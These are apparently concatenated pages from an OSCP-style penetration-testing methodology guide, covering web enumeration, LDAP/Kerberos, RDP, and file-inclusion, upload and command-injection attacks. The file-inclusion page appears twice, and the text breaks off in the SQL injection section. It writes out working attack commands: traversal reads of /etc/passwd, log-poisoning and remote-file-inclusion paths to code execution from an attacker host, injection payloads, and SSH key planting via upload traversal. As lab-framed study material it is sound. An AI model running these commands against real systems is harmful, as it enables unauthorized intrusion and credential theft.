Variant — replay through Burp Community ```bash curl -sk -x http://127.0.0.1:8080 http://TARGET:PORT/PATH ``` Confirm the proxy listener is active on `127.0.0.1:8080`. Use `-k` only for the controlled lab because it disables destination-certificate verification.
## Manual behavior map For every visible function, capture one unchanged request in Burp Proxy history, send it to Repeater and record: ```text METHOD PATH | CONTENT-TYPE | ACCESS CONTEXT/ROLE INPUT LOCATION + NAME | BASELINE VALUE STATUS | LENGTH/HASH | REDIRECT | MARKER/ERROR/TIME OBJECT/FUNCTION SELECTED | NEXT ONE-VARIABLE TEST ``` Check login/registration/reset, profiles/objects, search/filter/pagination, download/export/preview, upload/import, administration and every JavaScript API call. > **Next:** a browser-side restriction is not server authorization. Replay the raw request and change one field, object reference, method or access-context element at a time. ## Inspect exposed artifacts ```bash curl -sk http://TARGET:PORT/robots.txt curl -sk http://TARGET:PORT/sitemap.xml curl -sk http://TARGET:PORT/.git/HEAD curl -sk http://TARGET:PORT/openapi.json curl -sk http://TARGET:PORT/swagger.json ``` Also inspect HTML comments, hidden inputs, form actions, linked JavaScript, route strings, source-map references, cookies and response headers. > **Decisive output:** a path, parameter, API schema, object identifier, component or secret-bearing artifact that creates a specific next request. Source disclosure is not command execution. ## Discover files and directories Request a random nonexistent path first and record its status, length and body marker. ```bash gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-root.txt ``` > **Decisive output:** manually verified routes including useful `200`, redirect, `401`, `403` and `405` responses.
Variant — technology-aware extensions ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -t 10 -o gobuster-ext.txt ``` Choose extensions from observed stack evidence; do not spray every extension.
Variant — authenticated discovery ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -c 'SESSION=VALUE' -H 'Authorization: Bearer TOKEN' -t 10 -o gobuster-auth.txt ``` Use only the cookie or header that applies. An expired session can turn every result into the same login redirect.
Variant — filter a confirmed wildcard body length ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST --exclude-length NOISE_LENGTH -t 10 -o gobuster-filtered.txt ``` Filtering without first confirming the noise response can hide a real path.
## Discover virtual hosts ```bash gobuster vhost -u http://DOMAIN:PORT/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt ``` Alternative with automatic calibration: ```bash ffuf -w WORDLIST -u http://TARGET:PORT/ -H 'Host: FUZZ.DOMAIN' -ac -o ffuf-vhosts.json ``` > **Failure cue:** uniform status/length may be the default vhost. Compare each candidate with a random host header before adding it to the application map. ## Discover parameters and object values GET parameter names: ```bash ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://TARGET:PORT/PATH?FUZZ=test' -ac -o params-get.json ``` POST form parameter names: ```bash ffuf -w WORDLIST -u http://TARGET:PORT/PATH -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'known=value&FUZZ=test' -ac -o params-post.json ``` Object values with an authenticated API: ```bash ffuf -w NUMBERS -u 'http://TARGET:PORT/api/objects/FUZZ' -H 'Authorization: Bearer TOKEN' -mc all -fc 404 -o object-values.json ``` > **Decisive output:** a manually reproduced parameter or value that changes application behavior. Tool outliers are candidates, not confirmed access-control flaws.
ffuf — preserve a captured authenticated request Save a working raw request from the proxy as request.txt, retain its Host/cookie/body, and put FUZZ at the single parameter name/value or path being tested. Replay it once manually first. The request file does not specify TLS: choose the transport explicitly. ```bash # HTTPS request, including its original method and session headers ffuf -request request.txt -request-proto https -w WORDLIST -mc all -ac -t 10 -o request-https.json # Plain HTTP request: otherwise ffuf defaults to HTTPS ffuf -request request.txt -request-proto http -w WORDLIST -mc all -ac -t 10 -o request-http.json ``` > **Read:** compare an outlier's status/length/body with a known missing value, then replay that exact request. A login redirect for every value → refresh the session before continuing. A one-time CSRF token → repair token handling; the saved-request flag does not refresh it automatically. [ffuf request configuration](https://github.com/ffuf/ffuf/wiki/Home#request-configuration).
## Map API methods, schema and authorization ```bash curl -ski http://TARGET:PORT/api/v1/PATH curl -ski -X OPTIONS http://TARGET:PORT/api/v1/PATH curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD"}' http://TARGET:PORT/api/v1/login ``` > **Interpretation:** `405` can establish that a route exists but rejects the method. Validation errors can reveal required fields. A token establishes only the authorization demonstrated by a later request. Build a matrix across anonymous, user A, user B and administrator contexts where available: ```text PATH | METHOD | IDENTITY/ROLE | OBJECT/PROPERTY | RESULT | NEXT ``` ## Exit and handoffs > **Exit condition:** each interesting function has a baseline request, access context, controllable input, expected result, observed difference and cheapest next test. - file/path selector -> [file handling attacks](../03-initial-access/02-web-file-handling.md); - shell/diagnostic or database-backed input -> [command and SQL injection](../03-initial-access/03-command-and-sql-injection.md); - object/role/property or browser-script context -> [access control and XSS](../03-initial-access/04-access-control-and-xss.md); - product/plugin/version exploit candidate -> Block 6 public-exploit adaptation; - new credential -> Block 5 credential handling and authenticated re-enumeration; - verified server command execution -> Block 7 session handling. ## wfuzz alternative for paths and form values Use when wfuzz is the available/familiar client for the same controlled-response test. Choose a nonexistent control first; preserve the actual Host and authenticated session. ```bash # Paths; hiding 404s is appropriate only after checking the site's failure behavior wfuzz -c -z file,WORDLIST --hc 404 -u 'http://TARGET:PORT/FUZZ' # A form value in a working authenticated request wfuzz -c -z file,WORDLIST -b 'session=COOKIE' \ -d 'name=FUZZ' --hc 404 -u 'http://TARGET:PORT/PATH' ``` Read: status/length/body outliers need manual replay. Uniform redirects, wildcard bodies or expired cookies → fix the response/session controls before expanding the list. The presence of an outlier is not a vulnerability result. Sources: [upstream 1](https://github.com/xmendez/wfuzz). ## HTTP proxy variables — control which client request goes through Burp Use when a client honors HTTP proxy environment variables. Keeping them on a single invocation avoids accidentally proxying later unrelated traffic. ```bash http_proxy=http://127.0.0.1:8080 https_proxy=http://127.0.0.1:8080 \ curl -i http://TARGET:PORT/PATH # Explicit proxy and empty bypass list for a request that otherwise skips the proxy curl --proxy http://127.0.0.1:8080 --noproxy '' -i http://TARGET:PORT/PATH ``` Read: confirm the request in Burp history before trusting the replay. HTTP proxy settings do not tunnel arbitrary SMB/Kerberos traffic. For HTTPS, the client's certificate trust still matters; distinguish a local proxy/TLS error from an application response. Sources: [upstream 1](https://curl.se/docs/manpage.html). ## Extract candidate paths from a downloaded JavaScript file Use after reading an actual application JS file. This is a quick string candidate pass; it does not execute the script or understand its routing logic. ```bash curl -f http://TARGET:PORT/PATH/app.js -o app.js python3 -c 'import re; print("\n".join(sorted(set(re.findall(r"/[A-Za-z0-9_./-]+",open("app.js").read())))))' > js-paths.txt ``` Read: inspect the list and surrounding source for the correct hostname, API prefix, method, parameter names and required session. Comments, regular expressions and third-party URLs can create false candidates. Replay an observed function before turning strings into a fuzzing list; remove anything outside the assigned scope. Sources: [upstream 1](https://portswigger.net/web-security/api-testing). ## Sources Supplied PEN-200 Ch 8, pp201-231; [Hexdump web modules](https://github.com/LeonardoE95/OSCP/tree/main/modules/web); [Burp Proxy](https://portswigger.net/burp/documentation/desktop/tools/proxy); [curl](https://curl.se/docs/manpage.html); [Gobuster](https://github.com/OJ/gobuster); [ffuf](https://github.com/ffuf/ffuf).

# ldap and kerberos enumeration [← stage index](readme.md) | [ad procedures](../06-ad-lateral-movement/readme.md) | [service cheatsheet](../../cheatsheets/service-opportunities.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [extract opportunities from services](../../notes/methods/services.md) > **recognition:** ldap commonly appears on tcp/389 or tcp/636; global catalog on tcp/3268 or 3269; kerberos on tcp/udp 88. applications may listen elsewhere, so follow protocol evidence rather than port labels. ## baseline: discover naming contexts > **prerequisite:** ldap reachability. **coverage:** rootdse only; this can work even when directory searches require authentication. **decisive output:** `defaultnamingcontext` and `dnshostname`. ```bash ldapsearch -x -lll -h ldap://target:389 -s base -b '' \ defaultnamingcontext rootdomainnamingcontext configurationnamingcontext dnshostname ``` convert `dc=corp,dc=example` into `corp.example` for dns/kerberos work. preserve the server's exact hostname because kerberos is name-sensitive.
ldaps and certificate-name inspection ```bash openssl s_client -connect target:636 -servername dc_host a certificate can disclose domain/dc names. a tls validation error is a client trust/name issue, not proof that ldap is unavailable.
## anonymous directory search > **prerequisite:** known base dn and server permitting anonymous search. **failure cue:** `inappropriate authentication` or `insufficient access` closes only the anonymous path. ```bash ldapsearch -x -lll -h ldap://dc_ip:389 -b 'dc=domain,dc=tld' \ '(&(objectcategory=person)(objectclass=user))' \ samaccountname userprincipalname memberof description ``` ```bash ldapsearch -x -lll -h ldap://dc_ip:389 -b 'dc=domain,dc=tld' \ '(objectclass=group)' cn member description ``` ## authenticated search > **prerequisite:** a valid directory identity. **decisive output:** objects/attributes unavailable anonymously. avoid placing a real password in shell history when an interactive prompt is available. ```bash ldapsearch -x -lll -h ldap://dc_host:389 \ -d 'user@domain.tld' -w -b 'dc=domain,dc=tld' \ '(&(objectcategory=person)(objectclass=user))' \ samaccountname userprincipalname memberof description serviceprincipalname useraccountcontrol ```
search computers, groups and spn-bearing accounts separately ```bash ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain.tld' -w \ -b 'dc=domain,dc=tld' '(objectclass=computer)' \ dnshostname operatingsystem operatingsystemversion serviceprincipalname ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain.tld' -w \ -b 'dc=domain,dc=tld' '(objectclass=group)' cn member ldapsearch -x -lll -h ldap://dc_host:389 -d 'user@domain.tld' -w \ -b 'dc=domain,dc=tld' '(&(objectcategory=person)(serviceprincipalname=*))' \ samaccountname serviceprincipalname memberof ```
## kerberos prerequisites before an attack kerberos failures are often name/time/route failures rather than credential failures. establish: ```bash getent hosts dc_host nc -nvz dc_ip 88 date -u nmap -pn -sv -p 88,389,445,464,636,3268,3269 dc_ip -on dc-services.txt ``` > **interpretation:** resolve `domain` and `dc_host` consistently, keep clock skew within kerberos tolerance, and ensure the kdc is reached through the selected route. `kdc_err_c_principal_unknown` points to identity/domain naming; `krb_ap_err_skew` points to time; `kdc_err_preauth_failed` normally points to authentication material. ## handoff - new users, groups, computers, spns or domain names → [domain mapping](../06-ad-lateral-movement/01-domain-mapping.md). - a user confirmed without preauthentication → [kerberos and identity transitions](../06-ad-lateral-movement/03-kerberos-and-identity-transitions.md). - valid credentials → rerun authenticated ldap plus smb/share/remote-access enumeration. - certificate templates/ad cs clues → [ad cs and object-control abuse](../06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md). ## sources - [getsh common services: ldap](https://lizajose.github.io/getsh/common-services?service=ldap), source snapshot [`e1f62dd`](https://github.com/lizajose/getsh/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [openldap ldapsearch manual](https://www.openldap.org/software/man.cgi?query=ldapsearch&sektion=1) - [hexdump active directory modules](https://github.com/leonardoe95/oscp/tree/main/modules/active-directory)

# sip and irc triage

[← stage index](readme.md) | [service cheatsheet](../../cheatsheets/service-opportunities.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [extract opportunities from services](../../notes/methods/services.md)

these source-site topics contain only first-pass reconnaissance. treat them as application-identification branches, not default exploitation paths.

## sip

> commonly udp/tcp 5060 or tls 5061; follow protocol evidence.

```bash
nmap -pn -su -sv --script sip-methods -p 5060 target
nmap -pn -st -sv --script sip-methods -p 5060 target
```

> **decisive output:** a sip response and supported methods. `open|filtered` without application response remains ambiguous. do not run `sip-brute` until the exact registrar, known test identities, lockout policy and explicit authorization are established.

## irc

```bash
nmap -pn -sv --script irc-info -p port target
nc -nv target port
```

minimal registration for an authorized test client:

```text
nick testnick
user testuser 0 * :test user
quit
```

> **decisive output:** irc numeric replies, server/network name, version/capabilities or authentication requirement. do not use `irc-brute` as identification; authenticate only with legitimately acquired credentials.

# memcached and webdav

[stage index](readme.md) | [complete task index](../index.md)

## memcached — inspect cache data through tcp

use when a listener identifies as memcached, commonly tcp/11211. start with the text protocol; do not confuse cache access with an os shell.

```bash
# identify the service and inspect its counters
printf 'version\r\nstats\r\nquit\r\n' | nc -nv target port

# discover available slab/key metadata, if these commands are enabled
printf 'stats items\r\nlru_crawler metadump all\r\nquit\r\n' | nc -nv target port

# read one key learned from configuration or metadata
printf 'get key\r\nquit\r\n' | nc -nv target port
```

read: `value key ...` followed by content proves a readable item; `end` alone does not establish that every key is absent. configuration, session data or account material → identify its application/account and test that context. `error` can mean unsupported or disabled metadata commands. authentication/tls or a binary-only interface requires its matching client. udp amplification recipes are not part of this workflow.

sources: [upstream 1](https://github.com/memcached/memcached/blob/master/doc/protocol.txt).

## webdav — list, retrieve and test the actual write boundary

# rdp access [← stage index](readme.md) · [service validation](../02-service-enumeration/09-windows-remote-access.md) · [next: file transfer](../04-shells-transfers-credentials/01-file-transfer.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [move to another host](../../notes/methods/lateral-movement.md) > **purpose:** use a validated identity with remote desktop logon rights to establish a windows desktop and verify the resulting source position. ## baseline: prompt for the password ```bash xfreerdp3 /v:target /u:user /dynamic-resolution /cert:ignore ``` some kali releases expose `xfreerdp` instead of `xfreerdp3`; check `command -v xfreerdp3 xfreerdp` and the selected binary's `/help` output. > **decisive output:** a usable desktop establishes a remote session. open powershell or command prompt and verify `whoami`, `hostname` and `ipconfig` before treating commands as target-origin execution.
variant — domain identity ```bash xfreerdp3 /v:target /u:user /d:domain /dynamic-resolution /cert:ignore ``` local and domain accounts with the same username are different identities. make the intended context explicit when results differ.
variant — authentication only ```bash xfreerdp3 /v:target /u:user /d:domain /auth-only /cert:ignore ``` this tests authentication without opening the ui. success does not guarantee that all session policies or desktop initialization will permit a full session.
variant — explicit password ```bash xfreerdp3 /v:target /u:user '/p:password' /dynamic-resolution /cert:ignore ``` prefer prompting because command-line passwords can enter shell history and process listings.
> **failure cues:** a certificate warning is not a credential result. nla/security negotiation, account context, authentication, remote desktop logon rights and an already occupied/restricted session can fail separately. `/cert:ignore` is appropriate only for the controlled lab context because it removes certificate identity validation. > **next:** after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position.

# web file read, inclusion and upload paths [← stage index](readme.md) · [web mapping](../02-service-enumeration/10-http-web-mapping.md) · [quick sheet](../../cheatsheets/web-exploitation.md#file-paths-and-uploads) · [mechanics](../../notes/master_notes.md#file-handling-primitives) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **use when:** a request selects, includes, downloads, previews or uploads a file. prove read, inclusion, write and execution separately. ## directory traversal: prove file read linux proof: ```bash curl -skg --data-urlencode 'file=../../../../../../etc/passwd' http://target:port/path ``` windows proof: ```bash curl -skg --data-urlencode 'file=../../../../../../windows/system32/drivers/etc/hosts' http://target:port/path ``` > **decisive output:** recognizable contents of the requested target file. `200 ok`, a changed template or a filename reflected in an error is not proof.
variant — traversal occurs in the url path ```bash curl -sk --path-as-is 'http://target:port/static/../../../../etc/passwd' ``` `--path-as-is` prevents curl from collapsing `..` before sending the request.
variant — basic normalization/filter tests ```text ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd ``` try these only after a plain baseline. preserve the exact decoding layer that accepted the value.
> **next:** use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. send recovered authentication material to block 5 with its source and identity context. ## php inclusion: retrieve source ```bash curl -skg --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://target:port/index.php printf '%s' 'base64_data' | base64 -d ``` > **prerequisite:** a php file-inclusion sink that accepts the wrapper. the encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context. ## lfi to command execution through a writable/readable log ```bash curl -sk -a '' http://target:port/ curl -skg --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://target:port/index.php ``` > **prerequisites:** the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates php and the payload survives encoding. on windows/xampp, investigate application-specific paths such as `c:\xampp\apache\logs\access.log`. > **decisive output:** the unique command output and target execution identity. if code appears as text, only read/inclusion is proven.
variant — php data wrapper ```bash payload=$(printf '%s' '' | base64 -w0) curl -skg --data-urlencode "page=data://text/plain;base64,$payload" --data-urlencode 'cmd=id' http://target:port/index.php ``` requires url inclusion in the sink and php `allow_url_include=on`; it is disabled by default in current php configurations.
variant — remote file inclusion ```bash python3 -m http.server transfer_port --bind lhost curl -skg --data-urlencode 'page=http://lhost:transfer_port/check.php' --data-urlencode 'cmd=id' http://target:port/index.php ``` requires remote url inclusion, a compatible interpreter and target-to-`lhost:transfer_port` reachability. an absent http request is inconclusive until reachability and filtering are separated.
## upload: establish the primitive create and upload a benign canary: ```bash printf '%s\n' 'upload_canary_7f31' > probe.txt curl -sk -b cookies.txt -f 'file=@probe.txt;filename=probe.txt;type=text/plain' http://target:port/upload ``` then verify the returned identifier/path and retrieve the bytes. > **record separately:** acceptance, server-side name, storage path, retrieval url, response content type, filesystem write identity and whether the storage location is executable. ## upload: verify executable handling php example, only after php handler evidence: ```bash printf '%s\n' '' > check.php curl -sk -b cookies.txt -f 'file=@check.php;filename=check.php;type=application/x-php' http://target:port/upload curl -skg --data-urlencode 'cmd=id' http://target:port/uploads/check.php ``` > **decisive output:** target command output. a successful upload that downloads, displays source or returns inert text proves write/retrieval only.
variants — isolate validation layers in burp repeater test one property at a time: - bypass client-side checks by replaying the raw multipart request; - filename case or alternate extension only when the observed server maps it to the interpreter; - multipart `content-type` independently from filename and content; - magic bytes only when server behavior shows content inspection; - double extensions/trailing characters only when normalization evidence supports them; - server rename and final response `content-type`. ```bash curl -sk -b cookies.txt -f 'file=@check.php;filename=check.php;type=image/jpeg' http://target:port/upload ``` changing mime type is a test of validation, not proof of executable handling.
## upload with path control first use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. do not overwrite an existing file as a detection test.
lab-only variant — controlled ssh public-key placement ```bash ssh-keygen -t ed25519 -f ./web_upload_key -n '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -f 'file=@authorized_keys;filename=../../../../home/user/.ssh/authorized_keys' http://target:port/upload ssh -i ./web_upload_key -p ssh_port user@target ``` use only in a disposable authorized lab after confirming the exact user/home, ssh service, web write identity, destination semantics and overwrite impact. failure can mean path normalization, permission denial, ssh policy or a different user—not necessarily that upload path control is absent.
## exit and next action - file/source/credential disclosure -> block 5 and authenticated re-enumeration; - verified web command execution -> record `whoami`/`id`, hostname and working directory, then block 7; - write without execution -> identify the privileged consumer/trigger or retain it as a chain primitive; - product-specific handler/cve requirement -> block 6; - no decisive result -> return to the [web behavior map](../02-service-enumeration/10-http-web-mapping.md) with the exact disproven context. ## php include control — generate a filter chain when uploads are unavailable use only after confirming a php `include`/`require` sink accepts a fully controlled stream uri. a file-read endpoint that returns bytes without evaluating php is a different primitive. the required iconv/filter behavior must be present. ```bash # generate the chain locally; copy the complete uri from its output python3 php_filter_chain_generator.py --chain '' # replay the actual inclusion parameter, encoding the uri as one value curl -ss -g --data-urlencode 'page=filter_uri' http://target:port/path ``` read: an attributable target uid proves execution; base64-looking text alone can simply be source/file disclosure. filter errors, uri truncation or rejected wrappers → inspect the actual php build, filter availability and parameter limits. use the existing upload/log inclusion routes when their prerequisites fit; do not assume a modern `%00` suffix truncates a filename. sources: [upstream 1](https://github.com/synacktiv/php_filter_chain_generator). ## image/pdf upload plus inclusion — verify the consumer use when an accepted upload can later be read by a confirmed php include sink. mime, extension and magic-byte checks only describe acceptance; they do not establish an executable handler. ```bash # start with an existing valid test jpeg; place a small php effect in its metadata exiftool -comment='' probe.jpg file probe.jpg # retrieve the stored upload, then use the verified inclusion path curl -i http://target:port/uploads/stored_file curl -ss -g --data-urlencode 'page=path/to/stored_file' http://target:port/include_path ``` read: downloading image bytes is storage/read access; a uid returned by the include establishes execution in that php process. pdf/php combinations have the same consumer requirement. extension case, double extensions and content-type changes are separate validation tests, not a list to try blindly. treat null-byte filenames as a legacy parser hypothesis that needs version evidence. sources: [upstream 1](https://exiftool.org/) · [upstream 2](https://www.php.net/manual/en/function.include.php). ## sources supplied pen-200 ch 9.1-9.3, pp245-274; [hexdump traversal module](https://github.com/leonardoe95/oscp/tree/main/modules/web/04-directory-traversal), [file inclusion](https://github.com/leonardoe95/oscp/tree/main/modules/web/05-file-inclusion), [file upload](https://github.com/leonardoe95/oscp/tree/main/modules/web/06-file-upload-vulnerabilities); [owasp traversal/file inclusion](https://wstg.owasp.org/latest/4-web_application_security_testing/05-authorization/01-directory_traversal_file_include/).

# Web File Read, Inclusion and Upload Paths [← Stage index](README.md) · [Web mapping](../02-service-enumeration/10-http-web-mapping.md) · [Quick sheet](../../cheatsheets/web-exploitation.md#file-paths-and-uploads) · [Mechanics](../../notes/Master_Notes.md#file-handling-primitives) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **Use when:** a request selects, includes, downloads, previews or uploads a file. Prove read, inclusion, write and execution separately. ## Directory traversal: prove file read Linux proof: ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` Windows proof: ```bash curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH ``` > **Decisive output:** recognizable contents of the requested target file. `200 OK`, a changed template or a filename reflected in an error is not proof.
Variant — traversal occurs in the URL path ```bash curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' ``` `--path-as-is` prevents curl from collapsing `..` before sending the request.
Variant — basic normalization/filter tests ```text ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd ``` Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value.
> **Next:** use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context. ## PHP inclusion: retrieve source ```bash curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php printf '%s' 'BASE64_DATA' | base64 -d ``` > **Prerequisite:** a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context. ## LFI to command execution through a writable/readable log ```bash curl -sk -A '' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` > **Prerequisites:** the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as `C:\xampp\apache\logs\access.log`. > **Decisive output:** the unique command output and target execution identity. If code appears as text, only read/inclusion is proven.
Variant — PHP data wrapper ```bash PAYLOAD=$(printf '%s' '' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires URL inclusion in the sink and PHP `allow_url_include=On`; it is disabled by default in current PHP configurations.
Variant — remote file inclusion ```bash python3 -m http.server TRANSFER_PORT --bind LHOST curl -skG --data-urlencode 'page=http://LHOST:TRANSFER_PORT/check.php' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires remote URL inclusion, a compatible interpreter and target-to-`LHOST:TRANSFER_PORT` reachability. An absent HTTP request is inconclusive until reachability and filtering are separated.
## Upload: establish the primitive Create and upload a benign canary: ```bash printf '%s\n' 'UPLOAD_CANARY_7F31' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload ``` Then verify the returned identifier/path and retrieve the bytes. > **Record separately:** acceptance, server-side name, storage path, retrieval URL, response content type, filesystem write identity and whether the storage location is executable. ## Upload: verify executable handling PHP example, only after PHP handler evidence: ```bash printf '%s\n' '' > check.php curl -sk -b cookies.txt -F 'file=@check.php;filename=check.php;type=application/x-php' http://TARGET:PORT/upload curl -skG --data-urlencode 'cmd=id' http://TARGET:PORT/uploads/check.php ``` > **Decisive output:** target command output. A successful upload that downloads, displays source or returns inert text proves write/retrieval only.
Variants — isolate validation layers in Burp Repeater Test one property at a time: - bypass client-side checks by replaying the raw multipart request; - filename case or alternate extension only when the observed server maps it to the interpreter; - multipart `Content-Type` independently from filename and content; - magic bytes only when server behavior shows content inspection; - double extensions/trailing characters only when normalization evidence supports them; - server rename and final response `Content-Type`. ```bash curl -sk -b cookies.txt -F 'file=@check.php;filename=check.pHP;type=image/jpeg' http://TARGET:PORT/upload ``` Changing MIME type is a test of validation, not proof of executable handling.
## Upload with path control First use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. Do not overwrite an existing file as a detection test.
Lab-only variant — controlled SSH public-key placement ```bash ssh-keygen -t ed25519 -f ./web_upload_key -N '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload ssh -i ./web_upload_key -p SSH_PORT USER@TARGET ``` Use only in a disposable authorized lab after confirming the exact user/home, SSH service, web write identity, destination semantics and overwrite impact. Failure can mean path normalization, permission denial, SSH policy or a different user—not necessarily that upload path control is absent.
## Exit and next action - file/source/credential disclosure -> Block 5 and authenticated re-enumeration; - verified web command execution -> record `whoami`/`id`, hostname and working directory, then Block 7; - write without execution -> identify the privileged consumer/trigger or retain it as a chain primitive; - product-specific handler/CVE requirement -> Block 6; - no decisive result -> return to the [web behavior map](../02-service-enumeration/10-http-web-mapping.md) with the exact disproven context. ## PHP include control — generate a filter chain when uploads are unavailable Use only after confirming a PHP `include`/`require` sink accepts a fully controlled stream URI. A file-read endpoint that returns bytes without evaluating PHP is a different primitive. The required iconv/filter behavior must be present. ```bash # Generate the chain locally; copy the complete URI from its output python3 php_filter_chain_generator.py --chain '' # Replay the actual inclusion parameter, encoding the URI as one value curl -sS -G --data-urlencode 'page=FILTER_URI' http://TARGET:PORT/PATH ``` Read: an attributable target UID proves execution; base64-looking text alone can simply be source/file disclosure. Filter errors, URI truncation or rejected wrappers → inspect the actual PHP build, filter availability and parameter limits. Use the existing upload/log inclusion routes when their prerequisites fit; do not assume a modern `%00` suffix truncates a filename. Sources: [upstream 1](https://github.com/synacktiv/php_filter_chain_generator). ## Image/PDF upload plus inclusion — verify the consumer Use when an accepted upload can later be read by a confirmed PHP include sink. MIME, extension and magic-byte checks only describe acceptance; they do not establish an executable handler. ```bash # Start with an existing valid test JPEG; place a small PHP effect in its metadata exiftool -Comment='' probe.jpg file probe.jpg # Retrieve the stored upload, then use the verified inclusion path curl -i http://TARGET:PORT/uploads/STORED_FILE curl -sS -G --data-urlencode 'page=PATH/TO/STORED_FILE' http://TARGET:PORT/INCLUDE_PATH ``` Read: downloading image bytes is storage/read access; a UID returned by the include establishes execution in that PHP process. PDF/PHP combinations have the same consumer requirement. Extension case, double extensions and Content-Type changes are separate validation tests, not a list to try blindly. Treat null-byte filenames as a legacy parser hypothesis that needs version evidence. Sources: [upstream 1](https://exiftool.org/) · [upstream 2](https://www.php.net/manual/en/function.include.php). ## Sources Supplied PEN-200 Ch 9.1-9.3, pp245-274; [Hexdump traversal module](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/04-directory-traversal), [file inclusion](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/05-file-inclusion), [file upload](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/06-file-upload-vulnerabilities); [OWASP traversal/file inclusion](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/05-Authorization/01-Directory_Traversal_File_Include/).

# command and manual sql injection [← stage index](readme.md) · [web mapping](../02-service-enumeration/10-http-web-mapping.md) · [quick sheet](../../cheatsheets/web-exploitation.md#command-injection) · [mechanics](../../notes/master_notes.md#injection-primitives) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **use when:** mapped application behavior suggests attacker input reaches an operating-system command or database query. preserve a valid baseline, change one input at a time and prove each capability separately. ## operating-system command injection ### visible-output baseline start with a benign identity marker appropriate to the inferred operating system: ```bash curl -skg --data-urlencode 'host=127.0.0.1;id' http://target:port/path curl -skg --data-urlencode 'host=127.0.0.1&whoami' http://target:port/path ``` > **decisive output:** command output attributable to the target, such as a username/uid that is absent from the normal response. reflection of the payload is not execution.
variants — separators, quoting and post bodies test only the forms compatible with the observed command and platform: ```text 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid ``` ```bash curl -sk -x post -h 'content-type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://target:port/path curl -sk -x post -h 'content-type: application/json' -d '{"host":"127.0.0.1;id"}' http://target:port/api/path ``` for windows command contexts, use an observed `cmd.exe` or powershell boundary before choosing syntax: ```text 127.0.0.1 & whoami 127.0.0.1 | whoami ```
### blind timing proof repeat a control and a bounded-delay request several times: ```bash curl -sk -o /dev/null -w 'control=%{time_total}\n' -g --data-urlencode 'host=127.0.0.1' http://target:port/path curl -sk -o /dev/null -w 'test=%{time_total}\n' -g --data-urlencode 'host=127.0.0.1;sleep 5' http://target:port/path ``` windows candidate after platform evidence: ```text 127.0.0.1 & timeout /t 5 ``` > **decisive output:** a repeatable delay near the chosen interval relative to multiple controls. one slow response is inconclusive. ### after command execution ```text linux: id; hostname; pwd windows: whoami; hostname; cd ``` record the execution identity, working directory, shell/parser and egress assumptions. hand reliable-session work to block 7; do not treat one command response as an interactive shell. ## manual sql injection workflow > **exam boundary:** the current oscp+ exam guide prohibits sqlmap and other automatic exploitation tools. the following procedure is manual. recheck the current guide before an exam. ### 1. establish query influence replay a valid request in burp repeater. change one parameter and compare a normal value, quote, true condition and false condition: ```text value value' value' and '1'='1 value' and '1'='2 ``` for a 